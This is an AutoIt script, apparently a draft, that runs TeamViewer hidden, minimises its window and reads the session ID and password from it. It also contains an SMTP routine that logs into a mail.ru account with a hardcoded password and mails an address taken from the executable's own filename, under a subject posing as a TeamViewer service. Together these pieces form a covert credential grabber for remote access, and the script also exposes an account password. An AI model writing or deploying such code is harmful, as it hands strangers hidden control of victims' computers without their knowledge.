;~ $dir='D:\temp\Version8'
;~ ShellExecute($dir)
;~ sleep(500)



global $GetAdress, $GetAdressError=0
$GetAdress = _GetAdress()

Func _GetAdress($AutoItExe='')
;~ $AutoItExe=InputBox('','','TeamViewer newlogin7@gmail.com.exe')
	if $AutoItExe='' then
		$AutoItExe=StringReplace(@AutoItExe,".exe","")
	$GetAdress = StringRegExp($AutoItExe,'(\.|_|-| )([A-Za-z0-9._-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4})',1)
	if not @error then
		msgbox(0,'',$GetAdress[1])
	Else
		$GetAdressError=1
		$AutoItExe=InputBox('','','TeamViewer newlogin7@gmail.com.exe')
	EndIf
	return $GetAdress
EndFunc

exit
$SmtpServer = "smtp.mail.ru"    ; адрес SMTP сервера
$Port = "2525"                  ; Порт SMTP сервера
$FromAddress = "teamviewer.print@mail.ru"   ; адрес отправителя
$ToAddress = "newlogin7@gmail.com"     ; адрес назначения
$Subject = """Служба TeamViewer"""    ; тема письма
$Body = """Tekst в теле письма, или просто текст сообщения"""    ; тело письма (сам текст письма)
$AttachFiles =  "C:\265006334.tmp"    ; прикреплённые файлы к письму
$Username = $FromAddress ; "new1ogin@mail.ru"      ; имя пользователя аккаунта, с которого отправляется
$Password = "iopTHN1!"               ; Пароль

;~ $BlatArgs = "-t "&$ToAddress&" -f "&$FromAddress&" -s "&$Subject&" -body "&$Body&" -server "&$SmtpServer&" -u "&$Username&" -pw "&$Password&" -attach "&$AttachFiles&" -portSMTP "&$Port
;~ _SendMail($BlatArgs)

SendMail($ToAddress, $FromAddress, $Password, $Subject, $Body)








Run('"D:\temp\Version8\TeamViewer.exe" --noInstallation',"",@SW_HIDE)

WinWaitActive("TeamViewer")
WinWait("TeamViewer")
$hwnd2=WinWaitActive("TeamViewer")
ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $hwnd2 = ' & $hwnd2 & @CRLF ) ;### Debug Console

for $i=0 to 99
WinClose("Компьютеры и контакты")
WinSetState("TeamViewer", "", @SW_MINIMIZE )
$ID=ControlGetText ( "TeamViewer", "", "[CLASS:Edit; INSTANCE:2]" )
$password=ControlGetText ( "TeamViewer", "", "[CLASS:Edit; INSTANCE:3]" )
ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $password = ' & $password & @CRLF ) ;### Debug Console
ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $ID = ' & $ID & @CRLF ) ;### Debug Console
if StringRegExp ($password,'[0-9]')<>0 then ExitLoop
sleep(10)
Next
WinGetHandle("TeamViewer")
ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : WinGetHandle("TeamViewer") = ' & WinGetHandle("TeamViewer") & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
WinSetState("TeamViewer", "", @SW_MINIMIZE )






Func SendMail($To, $sFrom, $sPassw, $sSubject, $sMessage)
    TCPStartup()

    $iSocket = TCPConnect(TCPNameToIP('smtp.mail.ru'), 25)
    TCPSend($iSocket, 'HELO ' & @LogonDomain & @CRLF)

    While 1
        $sRecv = TCPRecv($iSocket, 2048)
        If $sRecv <> '' Then
            If StringRegExp($sRecv, '250 smtp(.*).mail.ru') Then TCPSend($iSocket, 'AUTH LOGIN' & @CRLF)
            If StringInStr($sRecv, 'VXNlcm5hbWU6') Then TCPSend($iSocket, _Base64_Encode($sFrom))
            If StringInStr($sRecv, 'UGFzc3dvcmQ6') Then TCPSend($iSocket, _Base64_Encode($sPassw))
            If StringInStr($sRecv, 'Authentication succeeded') Then
                TCPSend($iSocket, 'MAIL FROM: ' & $sFrom & @CRLF)
                TCPSend($iSocket, 'RCPT TO: ' & $To & @CRLF)
            EndIf
            If StringInStr($sRecv, '250 Accepted') Then TCPSend($iSocket, 'DATA' & @CRLF)
            If StringInStr($sRecv, '354 Enter message') Then
                TCPSend($iSocket, 'From: ' & $sFrom & @CRLF)
                TCPSend($iSocket, 'Subject: ' & $sSubject & @CRLF & @CRLF)
                TCPSend($iSocket, $sMessage & @CRLF)
                TCPSend($iSocket, '.' & @CRLF )
            EndIf
            If StringInStr($sRecv, '250 OK id=') Then
                TCPSend($iSocket, 'QUIT' & @CRLF)
                ExitLoop
            EndIf
        EndIf
        Switch StringMid($sRecv, 1, 3)
            Case 421 To 554
                Return SetError(-1, 0, 0)
        EndSwitch
    Wend

    TCPCloseSocket($iSocket)
    TCPShutdown()
    Return 1
EndFunc

Func _Base64_Encode($sData, $iFlag = 1)
    Local $Ret, $bData, $tData, $tText
    $bData = StringToBinary($sData, $iFlag)
    $tData = DllStructCreate('byte[' & BinaryLen($bData) & ']')
    DllStructSetData($tData, 1, $bData)
    $Ret = DllCall('crypt32.dll', 'bool', 'CryptBinaryToStringW', 'ptr', DllStructGetPtr($tData), 'dword', DllStructGetSize($tData), 'dword', 1, 'ptr', 0, 'dword*', 0)
    If (@error) Or (Not $Ret[0]) Then
        Return SetError(1, 0, '')
    EndIf
    $tText = DllStructCreate('wchar[' & $Ret[5] & ']')
    $Ret = DllCall('crypt32.dll', 'bool', 'CryptBinaryToStringW', 'ptr', DllStructGetPtr($tData), 'dword', DllStructGetSize($tData), 'dword', 1, 'ptr', DllStructGetPtr($tText), 'dword*', $Ret[5])
    If (@error) Or (Not $Ret[0]) Then
        Return SetError(1, 0, '')
    EndIf
    Return DllStructGetData($tText, 1)
EndFunc


;~ Func _SendMail($CMDstring)
;~     $BlatDLL = DllOpen ("blat.dll")
;~     $result=DllCall($BlatDLL,"int","Send","str",$CMDstring)
;~     DllClose ($BlatDLL)
;~ EndFunc
;~ Func _SendMail($CMDstring)
;~     $BlatDLL = DllOpen ("blat.dll")
;~     $result=DllCall($BlatDLL,"int","Send","str",$CMDstring)
;~     If @error Or Not $result[0] Then
;~         Return SetError(@error, @extended, 0)
;~     EndIf
;~     DllClose ($BlatDLL)
;~     Return 1
;~ EndFunc
